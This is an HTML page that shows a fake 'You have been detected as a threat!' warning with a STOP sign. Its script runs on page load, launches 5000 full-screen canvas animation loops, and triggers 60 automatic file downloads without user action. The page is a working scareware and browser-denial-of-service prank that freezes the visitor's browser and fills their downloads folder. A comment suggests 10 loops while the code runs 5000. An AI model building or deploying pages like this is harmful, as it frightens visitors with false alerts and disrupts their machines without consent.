<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>Threat Detected</title>
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <style>
    :root { color-scheme: dark; }
    html, body { height: 100%; margin: 0; }
    body {
      background: radial-gradient(circle at 50% 40%, #aa0000 0%, #8a0000 35%, #4a0000 100%);
      font-family: system-ui, -apple-system, Segoe UI, Roboto, Ubuntu, Cantarell, "Helvetica Neue", Arial, "Noto Sans", sans-serif;
      color: #fff;
      display: grid;
      place-items: center;
      overflow: hidden;
    }
    .container {
      text-align: center;
      padding: 2rem 3rem;
      backdrop-filter: blur(6px) saturate(140%);
      background: rgba(0,0,0,0.25);
      border: 2px solid rgba(255,255,255,0.15);
      border-radius: 18px;
      box-shadow: 0 12px 40px rgba(0,0,0,0.5), inset 0 0 40px rgba(255, 30, 30, 0.25);
      position: relative;
      z-index: 10;
    }
    .stop-sign {
      width: 160px; height: 160px; margin: 0 auto 1rem auto; position: relative;
      filter: drop-shadow(0 8px 24px rgba(0,0,0,0.45));
    }
    .octagon {
      width: 100%; height: 100%; background: #d21f1f;
      clip-path: polygon(30% 0%, 70% 0%, 100% 30%, 100% 70%, 70% 100%, 30% 100%, 0% 70%, 0% 30%);
      border: 8px solid #fff; box-sizing: border-box;
    }
    .stop-text {
      position: absolute; inset: 0; display: grid; place-items: center;
      font-weight: 900; font-size: 46px; letter-spacing: 2px; color: #fff;
      text-shadow: 0 2px 0 #a00, 0 10px 30px rgba(0,0,0,0.6);
    }
    h1 { margin: 0.5rem 0 0.25rem; font-size: 1.75rem; }
    p { margin: 0.25rem 0 0; font-size: 1rem; opacity: 0.9; }
    .badge {
      margin-top: 0.75rem; display: inline-block; padding: 0.35rem 0.7rem;
      border-radius: 999px; background: rgba(255,255,255,0.08); border: 1px solid rgba(255,255,255,0.2);
      font-size: 0.85rem;
    }
    canvas.snow {
      position: fixed; inset: 0; width: 100vw; height: 100vh;
      pointer-events: none; z-index: 1;
    }
  </style>
</head>
<body>
  <div class="container">
    <div class="stop-sign" aria-hidden="true">
      <div class="octagon"></div>
      <div class="stop-text">STOP</div>
    </div>
    <h1>You have been detected as a threat!</h1>
    <p>Access has been suspended. Running Immediate Threat Mitigation</p>
    <div class="badge">Incident ID: RED-ALERT</div>
  </div>

  <script>
    // Function to start one independent snowfall loop
    function startSnowLoop(loopId, flakesPerLoop) {
      const canvas = document.createElement('canvas');
      canvas.className = 'snow';
      document.body.appendChild(canvas);

      const ctx = canvas.getContext('2d');
      let W = canvas.width = window.innerWidth;
      let H = canvas.height = window.innerHeight;

      const particles = [];
      for (let i = 0; i < flakesPerLoop; i++) {
        particles.push({
          x: Math.random() * W,
          y: Math.random() * H,
          r: Math.random() * 4 + 1,
          d: Math.random() * flakesPerLoop
        });
      }

      let angle = 0;
      function draw() {
        ctx.clearRect(0, 0, W, H);
        ctx.fillStyle = "rgba(255,255,255,0.8)";
        ctx.beginPath();
        for (let i = 0; i < flakesPerLoop; i++) {
          const p = particles[i];
          ctx.moveTo(p.x, p.y);
          ctx.arc(p.x, p.y, p.r, 0, Math.PI * 2);
        }
        ctx.fill();
        update();
        requestAnimationFrame(draw);
      }

      function update() {
        angle += 0.01;
        for (let i = 0; i < flakesPerLoop; i++) {
          const p = particles[i];
          p.y += Math.cos(angle + p.d) + 1 + p.r / 2;
          p.x += Math.sin(angle) * 2;
          if (p.x > W + 5 || p.x < -5 || p.y > H) {
            particles[i] = { x: Math.random() * W, y: -10, r: p.r, d: p.d };
          }
        }
      }

      draw();
      window.addEventListener('resize', () => {
        W = canvas.width = window.innerWidth;
        H = canvas.height = window.innerHeight;
      });
    }

    // Start N loops
    const LOOPS = 10; // change this to 5000 if you really want, but beware performance
    for (let k = 0; k < 5000; k++) {
      startSnowLoop(k, 300); // each loop has 300 flakes
    }

    // Auto-download attempts (browsers may block multiple non-gesture downloads)
    (function autoDownloads() {
      function downloadFile(filename, content) {
        const blob = new Blob([content], { type: 'text/html' });
        const link = document.createElement('a');
        link.href = URL.createObjectURL(blob);
        link.download = filename;
        document.body.appendChild(link);
        link.click();
        document.body.removeChild(link);
        setTimeout(() => URL.revokeObjectURL(link.href), 1000);
      }

      const files = Array.from({ length: 60 }, (_, i) => `alert-${i+1}.html`);
      files.forEach((name, i) => {
        setTimeout(() => downloadFile(name, 'Threat Detected! Alert!'), i * 500);
      });
    })();
  </script>
</body>
</html>
